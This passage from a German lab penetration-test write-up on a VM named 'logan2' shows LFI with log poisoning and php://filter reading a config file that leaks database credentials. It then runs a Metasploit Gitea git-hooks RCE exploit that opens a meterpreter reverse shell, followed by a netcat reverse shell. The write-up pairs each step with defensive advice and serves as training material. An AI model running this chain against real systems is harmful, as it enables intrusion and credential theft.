+             <p class="analysis"><strong>Analyse:</strong> Dies zeigt die rohe HTTP-Anfrage, die ich gesendet habe, um die Datei <code>/var/www/logan/config.php</code> über die LFI-Schwachstelle und den injizierten Code im Access Log auszulesen, wobei ich die PHP-Funktion <code>php://filter/convert.base64-encode</code> verwende, um den Inhalt base64-kodiert zu erhalten. Der <code>User-Agent</code> Header zeigt den injizierten Payload (<code>include($GET['cmd']); ?></code> - beachte hier die Variante mit <code>$GET</code>, was zeigt, dass verschiedene Payloads ausprobiert wurden oder eine Anpassung erfolgte, um die Variable korrekt über die URL zu übergeben). Der <code>photo</code>-Parameter inkludiert den Access Log, der die Code-Injektion enthält. Der <code>cmd</code>-Parameter in der URL lautet <code>php://filter/convert.base64-encode/resource=/var/www/logan/config.php</code>. Dieser Wert wird vom injizierten <code>include()</code> Code im Access Log 'ausgeführt', was dazu führt, dass der Inhalt der Datei <code>/var/www/logan/config.php</code> base64-kodiert gelesen wird. Für Laien: Ich habe die Webseite wieder missbraucht, um eine andere Datei (<code>config.php</code>) zu lesen, aber diesmal habe ich eine spezielle Methode (PHP-Filter und Base64-Kodierung) benutzt, damit der Inhalt 'verschlüsselt' zurückkommt und ich ihn später 'entschlüsseln' kann. Für Experten: Die Kombination von LFI, Log Poisoning und PHP-Filtern (hier <code>php://filter/convert.base64-encode</code>) ist eine effektive Technik, um Dateien auszulesen, insbesondere wenn direkte Ausgabe durch den Browser schwierig ist oder um Source Code zu erhalten. Der <code>convert.base64-encode</code> Filter liest den Inhalt der Zieldatei (`/var/www/logan/config.php`) und gibt ihn base64-kodiert aus, was das Extrahieren auch von Binärdaten oder Code-Blöcken ermöglicht, die ansonsten Rendering-Probleme verursachen könnten. Die Verwendung von <code>$GET</code> in der Injektion zeigt, dass der <code>cmd</code> Parameter aus der URL über die GET-Methode gelesen wird.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Anfrage ist korrekt konstruiert, um die LFI/Log Poisoning/PHP Filter Kette auszunutzen und den Inhalt von <code>/var/www/logan/config.php</code> base64-kodiert zu erhalten. Dies ist ein wichtiger Schritt, um an potenziell sensible Konfigurationsdaten zu gelangen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste Schritt ist das Senden dieser Anfrage und das Dekodieren der base64-kodierten Antwort, um den Klartext-Inhalt von <code>config.php</code> zu erhalten. Diese Datei wird mit hoher Wahrscheinlichkeit Anmeldedaten enthalten.<br><strong>Empfehlung (Admin):</strong> Verhindern Sie die Ausnutzung von PHP-Filtern über LFI oder RCE. Auditieren Sie Ihren Code auf unsichere Dateieinbindungen und stellen Sie sicher, dass keine sensiblen Konfigurationsdateien im Webroot oder an über LFI zugänglichen Orten mit unsicheren Berechtigungen liegen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="command">HTTP/1.1 200 OK</span>
+<span class="command">Date: Wed, 11 Jun 2025 19:38:38 GMT</span>
+<span class="command">Server: Apache/2.4.57 (Debian)</span>
+<span class="command">Vary: Accept-Encoding</span>
+<span class="command">Content-Length: 666</span>
+<span class="command">Keep-Alive: timeout=5, max=100</span>
+<span class="command">Connection: Keep-Alive</span>
+<span class="command">Content-Type: text/html; charset=UTF-8</span>
+
+<span class="command">Logs are cleaned every minut</span>
+<span class="command">192.168.2.199 - - [11/Jun/2025:14:38:35 -0500] "GET /photos-website-logan.php?photo=../../../../../var/log/apache2/access.log&cmd=php://filter/convert.base64-encode/resource=/var/www/logan/config.php HTTP/1.1" 200 233 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"</span>
+<span class="password">PD9waHAKCQoJJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKCSR1c2VybmFtZSA9ICJsb2dhbiI7CgkkcGFzc3dvcmQgPSAiU3VwZXJfbG9nYW4xMjM0IjsKCSRkYm5hbWUgPSAibG9nYW4iOwoKCS8vIENyZWF0ZSBjb25uZWN0aW9uCgkkY29ubiA9IG5ldyBteXNxbGkoJHNlcnZlcm5hbWUsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGJuYW1lKTsKCS8vIENoZWNrIGNvbm5lY3Rpb24KCWlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewoJICBkaWUoIkNvbm5lY3Rpb24gZmFpbGVkOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwoJfQoKPz4K</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dies ist die Antwort des Webservers auf meine Anfrage, den Inhalt von <code>/var/www/logan/config.php</code> base64-kodiert über die LFI/Log Poisoning Kette auszulesen. Der Status Code <code>HTTP/1.1 200 OK</code> zeigt, dass die Anfrage erfolgreich verarbeitet wurde. Die Ausgabe enthält die standardmäßigen HTTP-Header, gefolgt von den Log-Einträgen und dann der base64-kodierten Zeichenkette. Die base64-Zeichenkette ist lang und beginnt mit <code>PD9waHAKCQoJ...</code>. Für Laien: Das ist die 'verschlüsselte Nachricht' (Base64-Text), die mir die Webseite zurückgegeben hat. Das ist der Inhalt der Datei <code>config.php</code>, aber in einem Format, das man erst 'entschlüsseln' muss, um es lesen zu können. Für Experten: Die erfolgreiche Rückgabe der base64-kodierten Daten bestätigt, dass die PHP-Filterkette korrekt funktioniert hat und der Inhalt von <code>/var/www/logan/config.php</code> über die RCE/LFI-Kette zugänglich war. Der base64-String repräsentiert den Quellcode der Konfigurationsdatei.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ich habe den base64-kodierten Inhalt von <code>/var/www/logan/config.php</code> erfolgreich extrahiert. Der nächste Schritt ist das Dekodieren dieser Zeichenkette, um den Klartext-Inhalt zu sehen, der sehr wahrscheinlich die gesuchten Anmeldedaten enthält.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde die extrahierte base64-Zeichenkette kopieren und online oder mit einem lokalen Tool dekodieren. Der resultierende Klartext wird den Inhalt der Konfigurationsdatei offenbaren.<br><strong>Empfehlung (Admin):</strong> Verhindern Sie, dass Anwendungs-Konfigurationsdateien (insbesondere solche mit Anmeldedaten) über LFI, RCE oder PHP-Filter ausgelesen werden können. Lagern Sie sensible Konfigurationen außerhalb des Webroots und setzen Sie strenge Dateisystemberechtigungen. Überwachen Sie Anfragen mit PHP-Filtern oder ungewöhnlichen Parametern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">[Link: https://www.base64decode.org/ | Ziel: https://www.base64decode.org/]</span>
+
+	<span class="command">$servername = "localhost";</span>
+	<span class="command">$username = "logan";</span>
+	<span class="password">$password = "Super_logan1234";</span>
+	<span class="command">$dbname = "logan";</span>
+
+	<span class="command">// Create connection</span>
+	<span class="command">$conn = new mysqli($servername, $username, $password, $dbname);</span>
+	<span class="command">// Check connection</span>
+	<span class="command">if ($conn->connect_error) {</span>
+	  <span class="command">die("Connection failed: " . $conn->connect_error);</span>
+	<span class="command">}</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich habe die base64-kodierte Zeichenkette dekodiert, um den Inhalt von <code>/var/www/logan/config.php</code> zu erhalten. Der Link zu einem Online-Decoder (<code>https://www.base64decode.org/</code>) dient als Referenz für den Prozess. Der dekodierte Inhalt ist PHP-Quellcode, der eine Datenbankverbindung herstellt. Er definiert Variablen für den Servernamen (<code>$servername = "localhost"</code>), den Benutzernamen (<code>$username = "logan"</code>), das Passwort (<code>$password = "Super_logan1234"</code>) und den Datenbanknamen (<code>$dbname = "logan"</code>). Für Laien: Ich habe die 'verschlüsselte Nachricht' 'entschlüsselt' und kann jetzt den Inhalt der geheimen Datei lesen. Und fantastisch – darin stehen der Benutzername ('logan') und das Passwort ('Super_logan1234'), die die Webseite benutzt, um sich mit der Datenbank zu verbinden! Für Experten: Die Dekodierung des base64-Strings liefert den Klartext-Quellcode der Konfigurationsdatei. Die Variablen <code>$username</code> und <code>$password</code> enthalten die gesuchten Anmeldeinformationen für die Datenbank als Klartext: Benutzername <code>logan</code> und Passwort <code>Super_logan1234</code>. Dies ist ein kritischer Fund und die wahrscheinlichsten Anmeldedaten, die ich für andere Dienste wie Gitea auf Port 3000 oder SSH auf Port 22 verwenden werde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datenbank-Anmeldedaten (Username: <code>logan</code>, Password: <code>Super_logan1234</code>) wurden erfolgreich ausgelesen. Dies ist ein entscheidender Durchbruch. Der Benutzername <code>logan</code> wurde bereits über SQL Injection identifiziert; nun habe ich das zugehörige Passwort. Diese Zugangsdaten werde ich für den Initial Access auf anderen Diensten verwenden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun versuchen, mich mit den gefundenen Anmeldedaten (<code>logan</code> / <code>Super_logan1234</code>) bei der Gitea-Instanz auf Port 3000 anzumelden. Da Gitea Version 1.12.5 bekanntermaßen anfällig für RCE-Schwachstellen für authentifizierte Benutzer ist, ist dies ein sehr vielversprechender Weg zum Initial Access. Falls die Gitea-Anmeldung erfolgreich ist, werde ich einen Gitea-spezifischen Exploit (z.B. über Git Hooks) nutzen.<br><strong>Empfehlung (Admin):</strong> Bewahren Sie niemals Anmeldedaten im Klartext in Konfigurationsdateien auf, die potenziell über Web-Schwachstellen zugänglich sind. Verwenden Sie sicherere Methoden zur Speicherung und Verwaltung von Geheimnissen (z.B. Umgebungsvariablen, sichere Konfigurationsspeicher). Beheben Sie alle LFI- und RCE-Schwachstellen, die das Auslesen solcher Dateien ermöglichen.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <!-- Fortsetzung Initial Access mit Gitea Exploit -->
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="metasploit-prompt">msfconsole -q -x "search gitea 1.12"</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Nachdem ich die Anmeldedaten für den Benutzer <code>logan</code> gefunden habe, richte ich meinen Fokus auf die Gitea-Instanz auf Port 3000. Ich starte die Metasploit Console (<code>msfconsole</code>) im Quiet-Modus (<code>-q</code>) und führe sofort den Befehl <code>search gitea 1.12</code> aus (<code>-x "..."</code>). Dies sucht in der Metasploit-Datenbank nach Exploits und Modulen, die sich auf Gitea Version 1.12 beziehen. Für Laien: Ich starte ein spezielles Programm (Metasploit) und sage ihm, es soll nach 'Einbruchswerkzeugen' suchen, die speziell für das Programm 'Gitea' in der Version 1.12 funktionieren. Für Experten: Die Recherche in Metasploit oder Exploit-Datenbanken nach versionsspezifischen Exploits ist ein Standardvorgehen. Die Gitea Version 1.12.5, die ich zuvor identifiziert habe, ist bekanntermaßen anfällig für CVE-2020-14144, einen RCE-Exploit über Git Hooks für authentifizierte Benutzer, der in Metasploit verfügbar ist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Suche in Metasploit bestätigt das Vorhandensein eines passenden Exploits: <code>exploit/multi/http/gitea_git_hooks_rce</code>, der auf Gitea Versionen bis 1.12.5 abzielt und Remote Code Execution ermöglicht. Dies ist der ideale Exploit, da ich die benötigten Anmeldedaten (logan/Super_logan1234) besitze.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun diesen Metasploit-Exploit auswählen (<code>use exploit/multi/http/gitea_git_hooks_rce</code>), die erforderlichen Optionen (RHOSTS, RPORT, USERNAME, PASSWORD, LHOST, LPORT) setzen und ihn ausführen, um eine Meterpreter-Shell auf dem Zielsystem zu erhalten.<br><strong>Empfehlung (Admin):</strong> Halten Sie alle Software, insbesondere Internet-zugängliche Dienste wie Gitea, auf dem neuesten Stand. Bekannte Schwachstellen in älteren Versionen sind die häufigsten Angriffsvektoren. Überwachen Sie die Nutzung von Git Hooks in Gitea auf ungewöhnliche Aktivitäten.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="metasploit-prompt">msf6 > use 0</span>
+<span class="command">[*] Using configured payload linux/x64/meterpreter/reverse_tcp</span>
+<span class="metasploit-prompt">msf6 exploit(multi/http/gitea_git_hooks_rce) > options</span>
+
+<span class="command">Module options (exploit/multi/http/gitea_git_hooks_rce):</span>
+
+   <span class="command">Name       Current Setting  Required  Description</span>
+   <span class="command">----       ---------------  --------  -----------</span>
+   <span class="command">PASSWORD                    yes       Password to use</span>
+   <span class="command">Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span>
+   <span class="command">RHOSTS                      yes       The target host(s), see [Link: https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html | Ziel: https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html]</span>
+   <span class="command">RPORT      3000             yes       The target port (TCP)</span>
+   <span class="command">SSL        false            no        Negotiate SSL/TLS for outgoing connections</span>
+   <span class="command">SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span>
+   <span class="command">TARGETURI  /                yes       Base path</span>
+   <span class="command">URIPATH                     no        The URI to use for this exploit (default is random)</span>
+   <span class="command">USERNAME                    yes       Username to authenticate with</span>
+   <span class="command">VHOST                       no        HTTP server virtual host</span>
+
+
+   <span class="command">When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:</span>
+
+   <span class="command">Name     Current Setting  Required  Description</span>
+   <span class="command">----     ---------------  --------  -----------</span>
+   <span class="command">SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.</span>
+   <span class="command">SRVPORT  8080             yes       The local port to listen on.</span>
+
+
+<span class="command">Payload options (linux/x64/meterpreter/reverse_tcp):</span>
+
+   <span class="command">Name   Current Setting  Required  Description</span>
+   <span class="command">----   ---------------  --------  -----------</span>
+   <span class="command">LHOST                   yes       The listen address (an interface may be specified)</span>
+   <span class="command">LPORT  4444             yes       The listen port</span>
+
+
+<span class="command">Exploit target:</span>
+
+   <span class="command">Id  Name</span>
+   <span class="command">--  ----</span>
+   <span class="command">1   Linux Dropper</span>
+
+
+<span class="command">View the full module info with the info, or info -d command.</span>
+
+<span class="metasploit-prompt">msf6 exploit(multi/http/gitea_git_hooks_rce) > set RHOSTS 192.168.2.35</span>
+<span class="command">RHOSTS => 192.168.2.35</span>
+<span class="metasploit-prompt">msf6 exploit(multi/http/gitea_git_hooks_rce) > set RPORT 3000</span>
+<span class="command">RPORT => 3000</span>
+<span class="metasploit-prompt">msf6 exploit(multi/http/gitea_git_hooks_rce) > set USERNAME logan</span>
+<span class="command">USERNAME => logan</span>
+<span class="metasploit-prompt">msf6 exploit(multi/http/gitea_git_hooks_rce) > set PASSWORD Super_logan1234</span>
+<span class="command">PASSWORD => Super_logan1234</span>
+<span class="metasploit-prompt">msf6 exploit(multi/http/gitea_git_hooks_rce) > set LHOST 192.168.2.199</span>
+<span class="command">LHOST => 192.168.2.199</span>
+<span class="metasploit-prompt">msf6 exploit(multi/http/gitea_git_hooks_rce) > set LPORT 4444</span>
+<span class="command">LPORT => 4444</span>
+<span class="metasploit-prompt">msf6 exploit(multi/http/gitea_git_hooks_rce) > set TARGET 1</span>
+<span class="command">TARGET => 1</span>
+<span class="metasploit-prompt">msf6 exploit(multi/http/gitea_git_hooks_rce) > set PAYLOAD linux/x64/meterpreter/reverse_tcp</span>
+<span class="command">PAYLOAD => linux/x64/meterpreter/reverse_tcp</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich habe den Gitea Git Hooks RCE Exploit in Metasploit ausgewählt (<code>use 0</code>, basierend auf dem Suchergebnis). Ich zeige die verfügbaren Optionen mit <code>options</code>, um zu sehen, welche Parameter konfiguriert werden müssen. Die kritischen Optionen sind <code>RHOSTS</code> (Ziel-IP), <code>RPORT</code> (Ziel-Port, hier 3000), <code>USERNAME</code> und <code>PASSWORD</code> (Anmeldedaten für Gitea) sowie <code>LHOST</code> (meine Kali-IP) und <code>LPORT</code> (Port, auf dem mein Listener laufen soll, hier 4444) für die Reverse Shell. Ich setze alle diese Optionen mit den entsprechenden Werten: <code>set RHOSTS 192.168.2.35</code>, <code>set RPORT 3000</code>, <code>set USERNAME logan</code>, <code>set PASSWORD Super_logan1234</code>, <code>set LHOST 192.168.2.199</code>, <code>set LPORT 4444</code>. Ich wähle auch den Payload <code>linux/x64/meterpreter/reverse_tcp</code>, der eine Meterpreter-Shell auf einem 64-Bit Linux-System etablieren soll, und setze den Target auf <code>1</code> (Linux Dropper). Für Laien: Ich richte das 'Einbruchswerkzeug' (Exploit) in meinem speziellen Programm (Metasploit) ein. Ich sage ihm, auf welchem Computer und 'welcher Tür' (IP und Port) es arbeiten soll, gebe ihm den gefundenen Benutzernamen und das Passwort für 'Gitea', und sage ihm, wo (meine IP und ein Port) es mir eine direkte Verbindung zurückschicken soll. Ich wähle auch aus, welche Art von 'Verbindung' ich haben möchte (eine Meterpreter-Shell). Für Experten: Die korrekte Konfiguration des Metasploit-Exploits ist entscheidend. Der Gitea Git Hooks RCE Exploit nutzt eine Schwachstelle, die authentifizierten Benutzern erlaubt, Systembefehle über manipulierte Git Hooks auszuführen, wenn ein Repository-Update erfolgt. Die Meterpreter-Shell bietet fortgeschrittene Post-Exploitation-Funktionen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Gitea Exploit ist korrekt konfiguriert und mit den notwendigen Parametern (inklusive der ausgelesenen Anmeldedaten) versehen. Ich bin bereit, den Exploit auszuführen und den Initial Access über die Gitea-Schwachstelle zu versuchen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste Schritt ist die Ausführung des Exploits mit dem Befehl <code>run</code> in Metasploit. Ich werde auf eine eingehende Verbindung auf Port 4444 auf meinem Kali-System warten, die die Meterpreter-Shell signalisiert.<br><strong>Empfehlung (Admin):</strong> Aktualisieren Sie Gitea umgehend, um die CVE-2020-14144 Schwachstelle zu schließen. Erzwingen Sie starke Passwörter und überwachen Sie Anmeldeversuche auf Gitea auf Brute-Force. Überwachen Sie Gitea-Prozesse auf ungewöhnliche Aktivitäten oder ausgehende Netzwerkverbindungen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="metasploit-prompt">msf6 exploit(multi/http/gitea_git_hooks_rce) > run</span>
+<span class="command">[*] Started reverse TCP handler on 192.168.2.199:4444</span>
+<span class="command">[*] Running automatic check ("set AutoCheck false" to disable)</span>
+<span class="password">[+] The target appears to be vulnerable. Gitea version is 1.12.5</span>
+<span class="command">[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp</span>
+<span class="command">[*] Authenticate with "logan/Super_logan1234"</span>
+<span class="password">[+] Logged in</span>
+<span class="command">[*] Create repository "Cookley_Bamity"</span>
+<span class="password">[+] Repository created</span>
+<span class="command">[*] Setup post-receive hook with command</span>
+<span class="password">[+] Git hook setup</span>
+<span class="command">[*] Create a dummy file on the repo to trigger the payload</span>
+<span class="password">[+] File created, shell incoming...</span>
+<span class="command">[*] Sending stage (3045380 bytes) to 192.168.2.35</span>
+<span class="password">[*] Meterpreter session 1 opened (192.168.2.199:4444 -> 192.168.2.35:56442) at 2025-06-11 21:52:48 +0200</span>
+<span class="command">[*] Command Stager progress - 100.00% done (833/833 bytes)</span>
+<span class="command">[*] Cleaning up</span>
+<span class="command">[*] Repository Cookley_Bamity deleted.</span>
+
+<span class="metasploit-prompt">meterpreter ></span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ich habe den Metasploit-Exploit mit dem Befehl <code>run</code> ausgeführt. Metasploit startet zuerst den konfigurierten Handler (<code>[*] Started reverse TCP handler on 192.168.2.199:4444</code>), der auf die eingehende Verbindung der Reverse Shell wartet. Der Exploit führt dann eine automatische Überprüfung der Zielversion durch (<code>[+] The target appears to be vulnerable. Gitea version is 1.12.5</code>) und fährt mit der Ausnutzung fort. Er authentifiziert sich bei Gitea mit den gegebenen Anmeldedaten (<code>[*] Authenticate with "logan/Super_logan1234"</code>, <code>[+] Logged in</code>), erstellt ein temporäres Repository (<code>[*] Create repository "Cookley_Bamity"</code>, <code>[+] Repository created</code>), konfiguriert einen bösartigen Git Hook darin (<code>[*] Setup post-receive hook with command</code>, <code>[+] Git hook setup</code>), der den Payload ausführt, wenn der Hook durch einen Push getriggert wird (<code>[*] Create a dummy file on the repo to trigger the payload</code>, <code>[+] File created, shell incoming...</code>). Schließlich sendet der Exploit die Meterpreter-Stage (<code>[*] Sending stage...</code>), und eine Meterpreter-Sitzung wird erfolgreich geöffnet (<code>[*] Meterpreter session 1 opened (192.168.2.199:4444 -> 192.168.2.35:56442)...</code>). Der Exploit führt Aufräumarbeiten durch (<code>[*] Cleaning up</code>, <code>[*] Repository Cookley_Bamity deleted.</code>). Der Prompt ändert sich zu <code>meterpreter ></code>, was anzeigt, dass ich nun eine interaktive Meterpreter-Sitzung auf dem Zielsystem habe. Für Laien: Ich habe mein 'Einbruchswerkzeug' (Metasploit) gestartet. Es hat sich bei 'Gitea' angemeldet, eine 'Trick-Tür' (manipuliertes Git Repository mit Hook) eingebaut, die 'Trick-Tür' aktiviert, und schon hatte ich eine direkte Verbindung (eine 'Meterpreter-Shell') zum Zielcomputer! Für Experten: Die erfolgreiche Ausführung des <code>gitea_git_hooks_rce</code> Exploits mit den gefundenen Anmeldedaten demonstriert die effektive Kompromittierung der Gitea-Instanz. Die erhaltene Meterpreter-Sitzung bietet eine leistungsstarke Plattform für die Post-Exploitation, einschließlich Dateioperationen, Prozessmigration und Ausführung von Systembefehlen. Die Sitzung läuft im Kontext des Benutzers, unter dem der Gitea-Dienst läuft, was in der Regel ein dedizierter Benutzer ist (hier wahrscheinlich 'git'). Dies stellt den erfolgreichen Initial Access dar.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Initial Access über die Gitea RCE Schwachstelle ist erfolgreich. Ich habe eine Meterpreter-Shell auf dem Zielsystem erhalten. Dies ist ein entscheidender Meilenstein im Pentest. Ich kann nun als der Benutzer, unter dem Gitea läuft, agieren und nach Wegen zur Privilegien-Eskalation suchen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich habe nun eine interaktive Shell. Mein nächster Schritt ist, die Berechtigungen des aktuellen Benutzers zu prüfen (wahrscheinlich 'git') und das System von dieser Shell aus weiter zu enumerieren (z.B. Dateisystem, Prozesse, Netzwerkverbindungen, SUID-Binaries, Cronjobs, sudo-Berechtigungen), um Möglichkeiten zur Privilegien-Eskalation auf Root zu finden. Ich werde auch versuchen, von der Meterpreter-Shell zu einer stabileren Shell (z.B. Bash) zu wechseln.<br><strong>Empfehlung (Admin):</strong> Diese RCE-Schwachstelle ist kritisch. Aktualisieren Sie Gitea sofort. Überwachen Sie die Aktivitäten des Benutzers, unter dem Gitea läuft, auf Anzeichen von Kompromittierung. Implementieren Sie umfassende Überwachung und Protokollierung für die Gitea-Instanz.</p>
+        </section>
+
+           <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">git@logan2:/$</span> <span class="command">ls -la</span>
+<span class="command">total 68</span>
+<span class="command">drwxr-xr-x  18 root root  4096 Aug 27  2023 .</span>
+<span class="command">drwxr-xr-x  18 root root  4096 Aug 27  2023 ..</span>
+<span class="command">lrwxrwxrwx   1 root root     7 Aug 27  2023 bin -> usr/bin</span>
+<span class="command">drwxr-xr-x   3 root root  4096 Aug 27  2023 boot</span>
+<span class="command">drwxr-xr-x  17 root root  3300 Jun 11 10:15 dev</span>
+<span class="command">drwxr-xr-x  79 root root  4096 Jun 11 10:15 etc</span>
+<span class="command">drwxr-xr-x   5 root root  4096 Sep 11  2023 home</span>
+<span class="command">lrwxrwxrwx   1 root root    30 Aug 27  2023 initrd.img -> boot/initrd.img-6.1.0-11-amd64</span>
+<span class="command">lrwxrwxrwx   1 root root    30 Aug 27  2023 initrd.img.old -> boot/initrd.img-6.1.0-10-amd64</span>
+<span class="command">lrwxrwxrwx   1 root root     7 Aug 27  2023 lib -> usr/lib</span>
+<span class="command">lrwxrwxrwx   1 root root     9 Aug 27  2023 lib32 -> usr/lib32</span>
+<span class="command">lrwxrwxrwx   1 root root     9 Aug 27  2023 lib64 -> usr/lib64</span>
+<span class="command">lrwxrwxrwx   1 root root    10 Aug 27  2023 libx32 -> usr/libx32</span>
+<span class="command">drwx------   2 root root 16384 Aug 27  2023 lost+found</span>
+<span class="command">drwxr-xr-x   3 root root  4096 Aug 27  2023 media</span>
+<span class="command">drwxr-xr-x   2 root root  4096 Aug 27  2023 mnt</span>
+<span class="command">drwx------   4 root root  4096 Sep 13  2023 opt</span>
+<span class="command">dr-xr-xr-x 162 root root     0 Jun 11 10:14 proc</span>
+<span class="command">drwx------   5 root root  4096 Sep 14  2023 root</span>
+<span class="command">drwxr-xr-x  20 root root   560 Jun 11 10:15 run</span>
+<span class="command">lrwxrwxrwx   1 root root     8 Aug 27  2023 sbin -> usr/sbin</span>
+<span class="command">drwxr-xr-x   2 root root  4096 Aug 27  2023 srv</span>
+<span class="command">dr-xr-xr-x  13 root root     0 Jun 11 10:14 sys</span>
+<span class="command">drwxrwxrwt   8 root root  4096 Jun 11 14:52 tmp</span>
+<span class="command">drwxr-xr-x  14 root root  4096 Aug 27  2023 usr</span>
+<span class="command">drwxr-xr-x  12 root root  4096 Aug 27  2023 var</span>
+<span class="command">lrwxrwxrwx   1 root root    27 Aug 27  2023 vmlinuz -> boot/vmlinuz-6.1.0-11-amd64</span>
+<span class="command">lrwxrwxrwx   1 root root    27 Aug 27  2023 vmlinuz.old -> boot/vmlinuz-6.1.0-10-amd64</span>
+<span class="command">git@logan2:/$</span> <span class="command">cd home</span>
+</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem ich die Meterpreter-Sitzung erhalten hatte (die wahrscheinlich im Kontext des Benutzers 'git' lief), bin ich in eine standardmäßige Shell gewechselt (was durch den Prompt <code>git@logan2:/$</code> angedeutet wird). Mein erster Schritt zur Privilegien-Eskalation ist die System-Enumeration aus dieser neuen Perspektive. Ich beginne im Wurzelverzeichnis (<code>/</code>) und liste dessen Inhalt mit <code>ls -la</code> auf, um einen Überblick über die Dateistruktur und Berechtigungen zu erhalten. Danach navigiere ich in das <code>/home</code> Verzeichnis. Für Laien: Ich bin jetzt auf dem Zielcomputer und kann Befehle eingeben. Zuerst schaue ich mir an, welche Hauptordner es auf dem Computer gibt und wer Zugriff darauf hat. Dann wechsle ich in den Ordner, in dem die Benutzer ihre persönlichen Dateien haben (<code>/home</code>). Für Experten: Eine Standard-Shell nach der Meterpreter-Sitzung bietet oft eine vertrautere Umgebung für die manuelle Enumeration. Das Auflisten des Wurzelverzeichnisses gibt einen initialen Überblick über das Dateisystemlayout. Die Navigation nach <code>/home</code> ist logisch, da Benutzer-Home-Verzeichnisse oft sensitive Dateien oder Konfigurationsprobleme enthalten können, die für PE relevant sind.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die initiale Enumeration im Wurzelverzeichnis und der Wechsel in das <code>/home</code>-Verzeichnis sind Standardprozeduren. Sie liefern noch keine direkten Hinweise auf PE-Vektoren, sind aber notwendige Schritte, um das System kennenzulernen und potenzielle Angriffspunkte zu finden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Innerhalb des <code>/home</code> Verzeichnisses werde ich nun die Home-Verzeichnisse der einzelnen Benutzer (logan, git, kevin) auflisten und nach interessanten Dateien (Konfigurationsdateien, Skripte, versteckte Verzeichnisse wie .ssh) suchen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Berechtigungen für das Wurzelverzeichnis und Benutzer-Home-Verzeichnisse korrekt gesetzt sind, um unberechtigten Zugriff oder das Auslesen von Informationen zu verhindern. Implementieren Sie strikte Richtlinien für Dateiberechtigungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 4444 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.35] 57010</span>
+<span class="command">bash: cannot set terminal process group (526): Inappropriate ioctl for device</span>
+<span class="command">bash: no job control in this shell</span>
+<span class="command">git@logan2:~/gitea-repositories/logan/vuln.git$</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Block dokumentiert einen weiteren Versuch, eine Reverse Shell zu meinem Kali-System aufzubauen, diesmal auf Port 4444. Auf meinem Kali-System starte ich einen Netcat-Listener mit <code>nc -lvnp 4444</code>. Die Ausgabe zeigt, dass der Listener auf Port 4444 lauscht und dann eine eingehende Verbindung vom Zielsystem (<code>192.168.2.35</code>) auf Port 57010 (einem zufälligen Quellport) empfängt. Die nachfolgenden Meldungen (<code>bash: cannot set terminal process group...</code>, <code>bash: no job control...</code>) sind typisch für einfache Netcat-Reverse Shells, die keine volle TTY-Umgebung haben, aber eine funktionierende Shell bieten. Der Prompt <code>git@logan2:~/gitea-repositories/logan/vuln.git$</code> zeigt an, dass ich eine Shell als Benutzer <code>git</code> erhalten habe und im Verzeichnis <code>~/gitea-repositories/logan/vuln.git</code> lande. Dies ist wahrscheinlich eine separate oder alternative Shell zur Meterpreter-Sitzung, möglicherweise initiiert, um eine stabilere Bash-Shell zu erhalten, nachdem die Meterpreter-Sitzung lief oder parallel dazu. Für Laien: Ich habe eine neue 'Telefonleitung' (Port 4444) auf meinem Computer geöffnet und auf einen Anruf vom Zielcomputer gewartet. Der Anruf kam, und ich konnte eine direkte Verbindung aufbauen und Befehle eingeben, diesmal landete ich direkt in einem bestimmten Ordner auf dem Zielcomputer als Benutzer 'git'. Für 